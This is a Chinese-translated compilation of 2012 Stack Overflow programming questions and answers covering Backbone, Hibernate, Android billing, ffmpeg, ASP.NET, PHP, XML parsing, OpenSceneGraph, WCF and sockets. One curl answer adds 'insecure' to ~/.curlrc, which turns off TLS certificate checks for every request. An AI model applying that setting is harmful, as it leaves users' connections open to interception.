如果我有一个包含一些属性 a、b 和 c 的类 A，它可以有一个 save 方法负责将这些属性保存到 db。

```
class A extends Backbone.View
  ...
  save: ->
    @model.set
      a : someVal
      b : someVal
      c : someVal
    @model.save() 
```

这似乎是最合乎逻辑的设置方式，但想听听一些关于你们如何做的建议。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:44:46.713

我正在使用稍微不同的方法。通常我有几个视图，编辑模型的各个部分，所有这些视图都有所谓的`flush()`方法（你命名它`save()`），它将数据从输入设置到模型。如果他们由于验证而无法刷新数据，则会显示就地错误。然后我有像“保存”这样的按钮，它刷新所有视图并将模型保存到服务器（如果所有刷新都成功）。此按钮的作用与您描述的完全一样。

Backbone 的魅力在于它不会强迫你以某种特定的方式做事，就像其他框架经常做的那样，你可以自由地以你喜欢的任何方式去做。

# java - Hibernate 二级缓存 (TreeCache) - 用于子实体

> ID：11735395
> 
> 赞同：1
> 
> 时间：2012-07-31T07:40:19.397
> 
> 标签：java, hibernate, jboss-cache

我使用 TreeCache 作为我的休眠二级实体缓存。我有一个实体层次结构，其中包含从用户扩展而来的客户和合作伙伴。我可以只缓存合作伙伴吗？我可以缓存用户，然后客户和解析器也会被缓存。但我想缓存一个选定的子类型。我使用每个类层次结构策略的单个表来存储数据。（带有鉴别器列的单个表）。感谢你的帮助。

谢谢

问候，

时代

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:58:54.800

Not really sure but you may have issues with chosen inheritance strategy, see: - [http://forums.terracotta.org/forums/posts/list/4849.page](http://forums.terracotta.org/forums/posts/list/4849.page) - [http://forums.terracotta.org/forums/posts/list/15/4849.page](http://forums.terracotta.org/forums/posts/list/15/4849.page) - [https://forum.hibernate.org/viewtopic.php?f=1&t=937742](https://forum.hibernate.org/viewtopic.php?f=1&t=937742)

Regards Philippe

# java - Android 应用内结算 - 签名 JSON 中的用户 ID

> ID：11735397
> 
> 赞同：0
> 
> 时间：2012-07-31T07:40:36.583
> 
> 标签：java, android, in-app-billing

当您验证用户完成交易时出现的签名 JSON 时，显然需要验证此特定购买是由特定用户进行的。当您将例如 userId 和签名的 JSON 发送到您的服务器以进行验证时，防止更改 userId 的可能性尤其重要。但是签名的 JSON 中没有这样的字段。

那么在`developerPayload`字段中放置一些 userId 可以吗？

```
{ "nonce" : 1836535032137741465,
  "orders" :
    [{ "notificationId" : "android.test.purchased",
       "orderId" : "transactionId.android.test.purchased",
       "packageName" : "com.example.dungeons",
       "productId" : "android.test.purchased",
       "developerPayload" : "bGoa+V7g/yqDXvKRqq+JTFn4uQZbPiQJo4pf9RzJ",
       "purchaseTime" : 1290114783411,
       "purchaseState" : 0,
       "purchaseToken" : "rojeslcdyyiapnqcynkjyyjh" }]
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T02:02:50.740

是的。可以在开发人员有效负载中放置一些用户身份。当您在 PURCHASE_STATE_CHANGED 广播中收到它时，您可以将其发送到您自己的服务器。

这与非托管项目尤其相关，您需要在自己的服务器上维护每个用户对这些项目的购买和使用。

真正的问题是您要发送什么用户身份以及从哪里获取它。它不能是特定于设备的，因为用户可能有多个设备。它确实需要是 Google Play 提供的身份。但我不知道如何找到它。

# facebook - facebook apprequests 对话框错误“发生错误。请稍后再试。”

> ID：11735398
> 
> 赞同：4
> 
> 时间：2012-07-31T07:41:04.337
> 
> 标签：facebook, invite, facebook-app-requests

我正在搜索所有可能的主题，但现在解决方案对我有用。

有我的代码，它适用于除 Chrome 之外的所有浏览器。只是有窗口 `An error occurred. Please try again later.`。

它与 FB 文档中的代码相同。

```
<div id="fb-root"></div>
<script src="http://connect.facebook.net/en_US/all.js"></script>

<script>
  FB.init({
    appId  : {$appId},
    frictionlessRequests: true
  });

  function sendRequestViaMultiFriendSelector() {
    FB.ui({ method: 'apprequests',
      message: '{_"FACEBOOK_INVITE_WINDOW_MESSAGE"}'
    }, requestCallback);
  }

  function requestCallback(response) {
    //callback code
  }
</script>

<a onclick="sendRequestViaMultiFriendSelector(); return false;"> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T18:31:04.110

这可能是因为您的应用程序仍处于沙盒模式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T15:33:58.793

您必须指定对话框的显示选项（'popup, 'iframe'...）

例如：

```
FB.init({
  appId  : {$appId},
  frictionlessRequests: true,
  display: 'popup'
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-23T17:42:22.740

您没有说明您的应用程序是否在 Facebook 上。这很重要的原因是因为`canvas_url`您的应用程序设置的参数。如果您**在**上`apps.facebook.com/app_namespace`，那么您已经填写了此字段。然而，有些项目根本不在 Facebook 本身上运行。在这种情况下，人们并不真正“需要”填写此参数。但是，应用程序请求必须正常工作。

当用户对应用程序请求进行操作（IE 接受它）时，他们将被重定向到该应用程序的画布 url。不指定画布 url 会使请求无效。这也可能是错误的原因。

尝试设置您的画布网址。你甚至可以让它重定向到你正确的 URL，它不需要“做”任何其他事情。

# ffmpeg - 使用 ffmpeg 编码原始 nv12 帧

> ID：11735399
> 
> 赞同：1
> 
> 时间：2012-07-31T07:41:06.057
> 
> 标签：ffmpeg

我正在尝试以 nv12 格式编码原始帧。帧率为 15。我正在使用 avcodec 进行编码。我的捕捉设备有一个回调函数，当原始取景框可用时激活。我正在复制原始取景器框架并从数据中制作一个 AVFrame。然后我将帧提供给 avcodec_encode_video，如 api 示例中所述，但不知何故我没有得到预期的结果。我正在使用 posix 线程。我将原始帧保存在缓冲区中。然后我的编码器线程从缓冲区收集数据并对其进行编码。编码速度太慢（经过 h264 和 mpeg1 测试）。是我的线程问题还是其他问题？我不知所措。输出很神秘。整个编码过程是一个函数和单线程，但我发现一次编码了一堆帧。

```
while(cameraRunning)
{
    pthread_mutex_lock(&lock_encoder);
    if(vr->buffer->getTotalData()>0)
    {
        i++;
        fprintf(stderr,"Encoding %d\n",i);
        AVFrame *picture;
        int y = 0,x;
        picture = avcodec_alloc_frame();
        av_image_alloc(picture->data, picture->linesize,c->width, c->height,c->pix_fmt, 1);
        uint8_t* buf_source = new uint8_t[vr->width*vr->height*3/2];
        uint8_t* data = vr->buffer->Read(vr->width*vr->height*3/2);
        memcpy(buf_source,data,vr->width*vr->height*3/2);
        //free(&vr->buffer->Buffer[vr->buffer->getRead()-1][0]);
        /*for (y = 0; y < vr->height*vr->width; y++)
        {
            picture->data[0][(y/vr->width) * picture->linesize[0] + (y%vr->width)] = buf_source[(y/vr->width)+(y%vr->width)]x + y + i * 7;
            if(y<vr->height*vr->width/4)
            {
                picture->data[1][(y/vr->width) * picture->linesize[1] + (y%vr->width)] = buf_source[vr->width*vr->height + 2 * ((y/vr->width)+(y%vr->width))]128 + y + i * 2;
                picture->data[2][(y/vr->width) * picture->linesize[2] + (y%vr->width)] = buf_source[vr->width*vr->height +  2 * ((y/vr->width)+(y%vr->width)) + 1]64 + x + i * 5;
            }
        } 
```

*/

```
 for(y=0;y<c->height;y++) {
                    for(x=0;x<c->width;x++) {
                        picture->data[0][y * picture->linesize[0] + x] = x + y + i * 7;
                    }
                }

                /* Cb and Cr */
                for(y=0;y<c->height/2;y++) {
                    for(x=0;x<c->width/2;x++) {
                        picture->data[1][y * picture->linesize[1] + x] = 128 + y + i * 2;
                        picture->data[2][y * picture->linesize[2] + x] = 64 + x + i * 5;
                    }
                }
        free(buf_source);
        fprintf(stderr,"Data ready\n");

        outbuf_size = 100000 + c->width*c->height*3/2;
        outbuf = (uint8_t*)malloc(outbuf_size);
        fprintf(stderr,"Preparation done!!!\n");
        out_size = avcodec_encode_video(c, outbuf, outbuf_size, picture);
        had_output |= out_size;
        printf("encoding frame %3d (size=%5d)\n", i, out_size);
        fwrite(outbuf, 1, out_size, f);
        av_free(picture->data[0]);
        av_free(picture);

    }
    pthread_mutex_unlock(&lock_encoder);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T19:48:21.060

您可以使用 libswscale 中的 sws_scale 进行色彩空间转换。首先使用 sws_getContext 创建一个 SwsContext，指定源 (NV12) 和目标 (YUV420P)。

```
m_pSwsCtx = sws_getContext(picture_width, 
               picture_height, 
               PIX_FMT_NV12, 
               picture_width, 
               picture_height,
               PIX_FMT_YUV420P, SWS_FAST_BILINEAR, NULL, NULL, NULL); 
```

然后当你想在每一帧都进行转换时，

```
sws_scale(m_pSwsCtx, frameData, frameLineSize, 0, frameHeight,
    outFrameData, outFrameLineSize); 
```

# asp.net - 如何在 FormView Inserted/Updated 事件中获取 ASP .NET 页面上提交表单的按钮

> ID：11735404
> 
> 赞同：0
> 
> 时间：2012-07-31T07:41:49.047
> 
> 标签：asp.net

我在 ASP .NET 表单上有两个按钮：**Save**和**Save & Return**。如果用户点击**Save & Return**我想保存数据等并转到另一个页面。如果用户点击**保存**我想留在当前页面。

但我不知道如何获取在 FormView 的更新/插入事件中单击了哪个按钮的信息。有机会得到吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:55:20.863

处理 FormView 的 ItemCommand 事件，保存按下按钮的引用。

```
LinkButton btn;
protected void FormView1_ItemCommand(object sender, FormViewCommandEventArgs e)
 {
    btn = e.CommandSource as LinkButton;
 }
protected void FormView1_ItemInserted(object sender, FormViewInsertedEventArgs e)
{
    if (btn.Text == "Save")
         e.KeepInInsertMode = true;

 } 
```

# curl - 如何将 cURL 设置为始终使用 -k 选项？

> ID：11735409
> 
> 赞同：10
> 
> 时间：2012-07-31T07:42:01.487
> 
> 标签：curl, command-line

出于某种原因，我的 darwin/bash/evn 变量版本不允许我从命令行使用 https 进行任何操作，我不知道为什么，但我已经尝试了一切。

但我发现 cURL（这是一个问题的平均原因）可以采用 -k 选项或 --insecure。这不是很好，但它现在可以工作。

我可以只使用用户别名 curl='curl -k' 吗？我从来没有使用别名来覆盖实际存在的命令，这会起作用吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-07-31T08:57:59.970

别名命令通常不是问题。您也可以放入`-k`或`--insecure`放入`$HOME/.curlrc`：

```
echo insecure >> $HOME/.curlrc 
```

# winforms - 杀死进程，抛出一个事件并在winform应用程序中捕获它

> ID：11735411
> 
> 赞同：0
> 
> 时间：2012-07-31T07:42:14.320
> 
> 标签：winforms, kill-process

我有一些控制一些 COMobject 的 Winform 应用程序（开始记录和停止记录） 当我启动 winform 应用程序时，我实际上是通过 uisng COMobject 开始记录的。

问题是如何停止记录（关闭 Winform 应用程序，在关闭事件时我将停止记录）。那么我该如何触发这个事件呢？我正在考虑杀死 WinForm 应用程序，但它似乎不起作用......

有任何想法吗 ？

谢谢

# c# - 如何动态添加css类？

> ID：11735413
> 
> 赞同：0
> 
> 时间：2012-07-31T07:42:29.917
> 
> 标签：c#, asp.net, html, css, dotnetnuke

我是 DotNetNuke 的新手，我在里面使用一个中继器，我正在使用 div 类，我无法在 css 中引用该类。它的重叠和相同的东西正在显示。我很难得到它，请帮帮我。请在下面找到代码

```
<div class="content-<%# DataBinder.Eval(Container.DataItem, "ImageId") %>"> 
  <h2><%# DataBinder.Eval(Container.DataItem, "Name") %></h2> 
  <p><%# DataBinder.Eval(Container.DataItem, "Descs") %></p> 
  <h3><%# DataBinder.Eval(Container.DataItem, "Name") %></h3> 
  <p><%# DataBinder.Eval(Container.DataItem, "Descs") %></p> 
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T12:38:36.117

我猜您正在尝试使用转发器模板显示图像和描述。以下是您可以轻松做到这一点的方法，将以下代码放入项目模板中：

```
<div id="img<%#Eval("ImageId","img{0}") %>" class="content"> 
  <h2><%# Eval("Name") %></h2> 
  <p><%# Eval("Descs") %></p></div>

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:11:35.903

试试这个解决方案， [DotNetNuke.com /post](http://www.dotnetnuke.com/Resources/Forums/forumid/109/threadid/430694/scope/posts.aspx)

# php - 标准化图像的正确方法

> ID：11735414
> 
> 赞同：3
> 
> 时间：2012-07-31T07:42:30.490
> 
> 标签：php, api, web, amazon

我正在构建一个将使用亚马逊产品广告 API 的 Web 应用程序。问题在于 API 会为每个产品返回不同大小和纵横比的图像。如果我将所有图像的大小调整为静态宽度/高度，那么由于比例的变化，其中一些看起来很奇怪。图像将按每行四行排列。我在想我只会使图像的宽度相同，同时保持纵横比相同，然后为高度设置某种最大阈值，以防API返回一些奇怪大小的图像。

但是，我想看看这里的人们以前是否遇到过这种情况，他们对这个设计问题的想法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:23:13.837

真是巧合。我面临着类似的问题，这就是我决定继续前进的方式。这可能不是最好的解决方案，但它对我有用。

首先我得到图像的原始高度和宽度

```
list($width, $height) = getimagesize("path to image"); 
```

然后我找出两者的最大公约数并将宽度和高度比存储在变量中，例如`$wr`和`$hr`

`$wr > $hr`然后通过比较水平方向和`$hr > $wr`垂直方向来检查图像方向（水平或垂直）

如果是水平的，我确保拇指大小不超过某个值，比如 120 像素，并根据纵横比使高度对应于 120 像素。如果方向是垂直的，则执行相同的操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-10T10:15:27.373

我在尝试标准化徽标时遇到了同样的问题。起初，我认为我可以选择一个标准区域并将所有图像调整到该区域，但该策略存在两个问题。首先，您必须设置高度和宽度的限制，因此有时您会得到面积较小的图像，因为它们非常宽或高。其次，这可能会使您的布局看起来很难看。就我而言，我在顶部有一个标题，一个图像，然后是下面的文本。我意识到一个非常宽的图像会在标题和文本之间留下很大的差距。因此，我需要一个优先考虑宽度的解决方案。我的意思是，图像可以在宽度上发生很大变化，而高度不会发生很大变化。不同的应用程序可能有不同的要求，

```
function width_to_height($width, $slope, $icpt){
    if ($width == 0){
        return FALSE;
    }
    return floor(($icpt + sqrt(pow($icpt, 2) + 4*$slope*pow($width, 2)))/(2*$width));
} 

function ratio_to_height($ratio, $slope, $icpt){
    if ($ratio == 0){
        return FALSE;
    }
    $area = $ratio*$slope + $icpt;
    return floor(sqrt($area/$ratio));
}   

function calc_dims($width, $height, $max_w=168, $max_h=100){
    $slope = 2500;
    $icpt = 6000;
    $ratio = $width/$height;
    $max_ratio = $max_w/$this->width_to_height($max_w, $slope, $icpt);
    if ($ratio > $max_ratio){
        $ht = floor($max_w/$ratio);
        return array('width' => $max_w, 'height' => $ht);
    }
    $ht = $this->ratio_to_height($ratio, $slope, $icpt);
    if ($ht > $max_h){
        $wd = floor($max_h*$ratio);
        return array('width' => $wd, 'height' => $max_h);
    }
    $wd = floor($ht*$ratio);
    return array('width' => $wd, 'height' => $ht);
} 
```

主函数是调用其他两个函数的 calc_dims()。因为我几乎总是使用类，所以这些函数是用“this->”运算符调用的。如果你不使用类，你可以简单地删除操作符。

你可以看到我硬编码了一些变量。（在我的实际应用程序中，这些是从配置文件中调用的。） $max_w 和 $max_h 作为图像的最大高度和宽度非常不言自明。但是 $slope 和 $icpt 可能有点难以理解。正如您在 ratio_to_height() 函数中看到的那样，$slope 和 $icpt（截距）是图像的面积和纵横比之间呈线性关系的分量。

您可以使用我提供的值 ($slope = 2500; $icpt = 6000)，也可以自己计算。我想过让这个过程自动化一点，但由于参数非常主观，它似乎不太实用。为了计算它们，有必要为纵横比的两个不同实例定义区域，其中比率为 $width/$height。例如，当比率为 1（$width = $height）时，您可能希望面积为 8000 像素^2，而当比率为 2（$width = 2*$height）时，面积可能为 12000 像素^ 2\. 有了这些值，我们有：

```
$A1 = 8000;
$A2 = 12000;
$r1 = 1;
$r2 = 2; 
```

您可以按如下方式计算斜率和截距：

```
$slope = ($A2 - $A1)/($r2 - $r1);
$icpt = $A1 - $slope*$r1; 
```

# java - Java：解析时跳过xml文件中的二进制数据

> ID：11735416
> 
> 赞同：0
> 
> 时间：2012-07-31T07:42:43.133
> 
> 标签：java, xml, parsing, binary

我想在 java 中解析一个包含二进制数据的 xml 文件：这是 xml 文件的一个示例：

```
<?xml version="1.0" encoding="utf-8"?>
<documents>
  <document>
    <element name="docid">
      <value><![CDATA[0902307e8004c74c]]></value>
    </element>
    <element name="published">
      <value><![CDATA[2012-01-01T00:00:00]]></value>
    </element>
    <element name="documenttype">
      <value><![CDATA[Circular]]></value>
    </element>
    <element name="data">
      <value><![CDATA[%PDF-1.6
%����
1020 0 obj
<</Filter/FlateDecode/First 20/Length 270/N 3/Type/ObjStm>>stream
�o^���)|�,�Ypoef�
l���o�&gt;����u���b"Cb�|���%&��D�yD��q�q�q�q�q��%_ja�LJob��/��3"=����o���]V11}�    }a�+'6@����C�,^}�d%�۠�`s��q��5�׷^(�N��{S<S�����A��������-������f\ڌ��|U/݌�z���f�I9����g�g���s���0z'��X~
endstream
endobj
startxref
55097
%%EOF
]]></value>
    </element>
    <element name="dataname">
      <value><![CDATA[sdfsfsfsdsdfsd.pdf]]></value>
    </element>
  </document>
</documents> 
```

通常我会这样解析这样的xml文件：

```
Document doc = null;
DocumentBuilder documentBuilder = null;
documentBuilderFactory = DocumentBuilderFactory.newInstance();
        try {
            documentBuilder = documentBuilderFactory.newDocumentBuilder();
        } catch (ParserConfigurationException e) {
            e.printStackTrace();
        }
try {

            doc = documentBuilder.parse(fastXMLFile);

        } catch (SAXException e) {
            System.out.println("SAXExept");
            e.printStackTrace();
        } catch (IOException e) {
            System.out.println("Test");
            return;
        } 
```

但是由于包含二进制数据的“数据”元素，调试器告诉我：

```
[Fatal Error] xmlfile.xml:58:10: An invalid XML character (Unicode: 0x1a) was found in the CDATA section.
SAXExept
org.xml.sax.SAXParseException: An invalid XML character (Unicode: 0x1a) was found in the CDATA section. 
```

我现在不需要解析这个数据字段，我可以跳过它。我只想解析其余的数据。这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:48:59.710

由于您的 XML 包含无效字符（如异常所示），因此您不能期望库成功解析它。由于您无法更改 XML 文件的创建过程，并且由于您看不到搜索引擎的代码，我相信对您来说最简单的方法是从 XML 中删除无效字符。

所以这个过程是：

1- 将 XML 的内容读入字符串

2-解析字符串并删除所有无效字符

3-将字符串写回文件中。或者如果您无法修改原始文件，请创建一个新文件

4-解析修改/新文件。

为了替换无效字符，请参阅以下链接，因为它还包括一种方法。

[无效的 XML 字符：当有效的 UTF8 并不意味着有效的 XML 时](http://blog.mark-mclaren.info/2007/02/invalid-xml-characters-when-valid-utf8_5873.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:46:27.537

您的 XML 文档无效。PDF 数据应为 base64 编码或 HEX。我认为除了更改您的文档之外没有其他解决方案。

问候

# c++ - OpenSceneGraph 浮动图像

> ID：11735418
> 
> 赞同：3
> 
> 时间：2012-07-31T07:42:49.183
> 
> 标签：c++, image, floating-point, openscenegraph

使用 C++ 和 OSG 我正在尝试将浮动纹理上传到我的着色器，但不知何故它似乎不起作用。最后，我发布了我的部分代码。主要问题是如何使用浮点数组中的数据创建 osg::Image 对象。在 OpenGL 中，所需的代码是

```
glTexImage2D(GL_TEXTURE_2D, 0, GL_LUMINANCE32F_ARB, width, height, 0, 
             GL_LUMINANCE, GL_FLOAT, data); 
```

但在这种情况下，我必须使用 OSG。

使用时代码运行良好

```
Image* image = osgDB::readImageFile("someImage.jpg"); 
```

代替

```
image = new Image; 
```

但我需要上传生成的浮点数据。也无法切换到无符号字符数组，因为我需要着色器代码中的 GL_LUMINANCE32F_ARB 数据范围。

我希望有人可以在这里帮助我，因为谷歌无法帮助我（谷歌搜索例如：osg float image）。所以这是我的代码。

```
using namespace std;
using namespace osg;
//...
float* data = new float[width*height];
fill_n(data, size, 1.0); // << I actually do this for testing purposes
Texture2D* texture = new Texture2D;
Image* image = new Image;
osg::State* state = new osg::State;
Uniform* uniform = new Uniform(Uniform::SAMPLER_2D, "texUniform");
texture->setInternalFormat(GL_LUMINANCE32F_ARB);
texture->setDataVariance(osg::Object::DYNAMIC);
texture->setFilter(osg::Texture2D::MIN_FILTER, osg::Texture2D::LINEAR);
texture->setFilter(osg::Texture2D::MAG_FILTER, osg::Texture2D::LINEAR);
texture->setWrap(osg::Texture2D::WRAP_T, osg::Texture2D::CLAMP_TO_EDGE);
texture->setWrap(osg::Texture2D::WRAP_S, osg::Texture2D::CLAMP_TO_EDGE);
if (data == NULL)
  cout << "texdata null" << endl; // << this is not printed
image->setImage(width, height, 1, GL_LUMINANCE32F_ARB,
                GL_LUMINANCE, GL_FLOAT,
                (unsigned char*)data, osg::Image::USE_NEW_DELETE);
if (image->getDataPointer() == NULL)
  cout << "datapointernull" << endl; // << this is printed
if (!image->valid())
  exit(1); //  << here the code exits (hard exit just for testing purposes)
osgDB::writeImageFile(*image, "blah.png");
texture->setInternalFormat(GL_LUMINANCE32F_ARB);
texture->setImage(image);
camera->getOrCreateStateSet()->setTextureAttributeAndModes(4, texture);
state->setActiveTextureUnit(4);
texture->apply(*state);
uniform->set(4);
addProgrammUniform(uniform); 
```

我在网上找到了另一种方法，让 osg::Image 创建数据并在之后填充。但不知何故，这也行不通。我在新的 XYZ 之后插入了这个；线。

```
image->setInternalTextureFormat(GL_LUMINANCE32F_ARB);
image->allocateImage(width,height,1,GL_LUMINANCE,GL_FLOAT);
if (image->data() == NULL)
  cout << "null here?!" << endl; // << this is printed. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-16T07:48:57.103

我使用以下（简化的）代码来创建和设置浮点纹理：

```
// Create texture and image
osg::Texture* texture = new osg::Texture2D;
osg::Image* image = new osg::Image();
image->allocateImage(size, size, 1, GL_LUMINANCE, GL_FLOAT);
texture->setInternalFormat(GL_LUMINANCE32F_ARB);
texture->setFilter(osg::Texture::MIN_FILTER, osg::Texture::LINEAR);
texture->setFilter(osg::Texture::MAG_FILTER, osg::Texture::LINEAR);
texture->setWrap(osg::Texture::WRAP_S, osg::Texture::CLAMP_TO_EDGE);
texture->setWrap(osg::Texture::WRAP_T, osg::Texture::CLAMP_TO_EDGE);
texture->setImage(image);

// Set texture to node
osg::StateSet* stateSet = node->getOrCreateStateSet();
stateSet->setTextureAttributeAndModes(TEXTURE_UNIT_NUMBER, texture);

// Set data
float* data = reinterpret_cast<float*>(image->data());
/* ...data processing... */
image->dirty(); 
```

您可能想要更改一些参数，但这应该让您有一个开始。我相信在你的情况下`TEXTURE_UNIT_NUMBER`应该设置为 4。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-11-16T11:47:58.317

> 但我需要上传生成的浮点数据。也无法切换到无符号字符数组，因为我需要着色器代码中的 GL_LUMINANCE32F_ARB 数据范围。
> 
> `osgDB::writeImageFile(*image, "blah.png");`

png 文件不支持每通道 32 位数据，因此您不能以这种方式将纹理写入文件。[请参阅 libpng 书](http://www.libpng.org/pub/png/book/chapter08.html)：

> PNG 灰度图像支持任何图像类型的最广泛的像素深度。支持 1、2、4、8 和 16 位的深度，涵盖从简单的黑白扫描到全深度医学和原始天文图像的所有内容。 [63]
> 
> [63] 校准后的天文图像数据通常存储为 32 位或 64 位浮点值，一些原始数据表示为 32 位整数。PNG 不直接支持这两种格式，尽管原则上可以设计一个辅助块来保存正确的转换信息。然而，转换具有超过 16 位动态范围的数据将是一种有损转换——至少，除非滥用 PNG 的 alpha 通道或 RGB 功能。

对于每通道 32 位，请查看[OpenEXR 格式](http://www.openexr.com/)。

但是，如果 16 位浮点数（即半个浮点数）就足够了，那么您可以这样做：

```
osg::ref_ptr<osg::Image> heightImage = new osg::Image;
int pixelFormat = GL_LUMINANCE;
int type = GL_HALF_FLOAT;
heightImage->allocateImage(tex_width, tex_height, 1, pixelFormat, type); 
```

现在要实际使用和编写半浮点数，您可以使用[GLM 库](http://glm.g-truc.net/0.9.5/index.html)。您可以通过 include 获得半浮点类型`<glm/detail/type_half.hpp>`，然后调用`hdata`. 您现在需要从图像中获取数据指针并将其转换为上述格式：

```
glm::detail::hdata *data = reinterpret_cast<glm::detail::hdata*>(heightImage->data()); 
```

然后您可以像访问一维数组一样访问它，例如

```
data[currentRow*tex_width+ currentColumn] = glm::detail::toFloat16(3.1415f); 
```

并不是说如果您将相同的数据写入`bmp`或`tif`文件（使用 osg 插件），结果将不正确。就我而言，我只是将预期图像的左半部分拉伸到全宽，而不是灰度，而是一些奇怪的颜色编码。

# .net - 如何为 WCF BasicHttpBinding Web 服务发布类似 ASMX 的帮助页面

> ID：11735420
> 
> 赞同：2
> 
> 时间：2012-07-31T07:42:55.727
> 
> 标签：.net, wcf, web-services, wcf-binding

我已经使用 BasicHttpBinding 创建了一个 WCF Web 服务。当我浏览 .svc 文件时，我得到一个指向 WSDL 定义的链接和*“你已经创建了一个服务。要测试这个服务，你需要创建一个客户端......”*：

![WCF 帮助页面](../Images/baf2b9faf89abf3c2067ab9fc3ffc1fb.png)

ASMX 帮助页面显示有关支持的操作的更多详细信息：

![ASMX 帮助页面](../Images/191ecebccd2860989e2df839d8163e5e.png)

有没有办法像 ASMX 服务一样自动显示有关单个 WCF 服务操作的信息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T13:03:58.233

```
<endpointBehaviors>
   <behavior name="MyCostumBehavior">
      <webHttp helpEnabled="true"/>
   </behavior>
</endpointBehaviors>
<!-- ... -->
<services>
   <service behaviorConfiguration="MyCostumBehavior".... 
```

此配置适用于 SOAP 和 Rest WCF

# c# - NetworkStream.Read() 和 SSL

> ID：11735421
> 
> 赞同：1
> 
> 时间：2012-07-31T07:43:03.060
> 
> 标签：c#, networkstream

只是想知道是否有人可以查看以下代码并向我解释为什么长度变量返回 0：

```
textToBeEncrypted = Encoding.ASCII.GetString(buffer);
txtEncryptedText = AESEncryption(textToBeEncrypted, key, true);
byte[] encText = Encoding.ASCII.GetBytes(txtEncryptedText);

NetworkStream stream = s.GetStream();
stream.Write(encText, 0, PACKET_SIZE);

s.ReceiveTimeout = Timeout;

int length = stream.Read(buffer, 0, PACKET_SIZE);
if (length == PACKET_SIZE)
{
    string decText = Encoding.ASCII.GetString(encText);
    txtDecryptedText = AESDecryption(decText, key, true);
    buffer = Encoding.ASCII.GetBytes(txtDecryptedText);
    retval = Decode();
} 
```

在我使用 AES 对所有内容进行编码后，我在 encText 中写出 1366 字节的数据（PACKET_SIZE 为 1036）。我没有收到关于发送的任何投诉；数据愉快地发送出去。但是，当它尝试将其读回时，长度始终为 0，这意味着我无法输入解码语句括号。有任何想法吗？（在有人问之前，retval 是一个字符串）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:50:39.353

如果这`length`是零：

```
int length = stream.Read(buffer, 0, PACKET_SIZE); 
```

这意味着另一台机器已经关闭了他们的出站套接字（你的入站套接字），并且不再有数据可用。

您还应该非常小心：

```
if (length == PACKET_SIZE)
{...} 
```

绝对**不能保证**您阅读的内容。你*应该*在这里做的是缓冲数据，直到你有一个完整的消息（帧），然后处理你缓冲的内容。特别是，如果另一端发送的字节数少于`PACKET_SIZE`字节，则保证您的代码什么也不做。即使另一端*准确地* `PACKET_SIZE`发送了字节，它也不太可能**准确**地到达一个`PACKET_SIZE`字节块。

例如：

```
int length;
MemoryStream ms = new MemoryStream();
while((length = stream.Read(buffer, 0, buffer.Length)) > 0) {
    ms.Write(buffer, 0, length); // append what we just recieved

    // now: could check `ms` to see if we have a "frame" here...
}
//...or you could just process the entire recieved data here 
```

# android - 在 CoverFlow 中重叠的 Android Gallery 坏图像

> ID：11735422
> 
> 赞同：2
> 
> 时间：2012-07-31T07:43:05.053
> 
> 标签：android, gallery, coverflow

我正在[从这里](http://www.inter-fuser.com/2010/02/android-coverflow-widget-v2.html)修补 CoverFlow以匹配我的偏好，但无法解决一个问题。这是屏幕截图：

[截屏](http://imgur.com/oWvA4)

中心图像右侧的图片以不良方式重叠。这是我的代码：

```
protected boolean getChildStaticTransformation(View child, Transformation t) {

  final int childCenter = getCenterOfView(child);
  int rotationAngle = 0;
  t.clear();
  t.setTransformationType(Transformation.TYPE_MATRIX);

    if (childCenter == mCoveflowCenter) {
        transformImageBitmap((ImageView) child, t, 0);
    } else {      
        rotationAngle = Math.abs(mCoveflowCenter - childCenter);
        transformImageBitmap((ImageView) child, t, rotationAngle);         
    }    

return true;
}

/**
* This is called during layout when the size of this view has changed. If
* you were just added to the view hierarchy, you're called with the old
* values of 0.
*
* @param w Current width of this view.
* @param h Current height of this view.
* @param oldw Old width of this view.
* @param oldh Old height of this view.
 */
  protected void onSizeChanged(int w, int h, int oldw, int oldh) {
  mCoveflowCenter = getCenterOfCoverflow();
  super.onSizeChanged(w, h, oldw, oldh);
 }

 /**
  * Transform the Image Bitmap by the Angle passed 
  * 
  * @param imageView ImageView the ImageView whose bitmap we want to rotate
  * @param t transformation 
  * @param rotationAngle the Angle by which to rotate the Bitmap
  */
 private void transformImageBitmap(ImageView child, Transformation t, int rotationAngle) {            
  mCamera.save();
  final Matrix imageMatrix = t.getMatrix();
  final int imageHeight = child.getLayoutParams().height;
  final int imageWidth = child.getLayoutParams().width;

  mCamera.translate(0.0f, 0.0f, 100.0f);

  float zoomAmount = 0;
  //skalowanie za pomocą translate nie rotational angle?
  zoomAmount = Math.abs((float) (rotationAngle));

  Log.v("zoom", Float.toString(zoomAmount));
  mCamera.translate(0.0f, 0.0f, zoomAmount - 300.0f);          

  mCamera.getMatrix(imageMatrix);               
  imageMatrix.preTranslate(-(imageWidth/2), -(imageHeight/2)); 
  imageMatrix.postTranslate((imageWidth/2), (imageHeight/2));
  mCamera.restore();
} 
```

它为每张图片平移相机，因此较小的图片更能进入屏幕（在 logcat 值是完美的）。这是什么意思？我必须先画较小的照片，然后再画大的，等等吗？如果是这样，我该怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T17:55:54.677

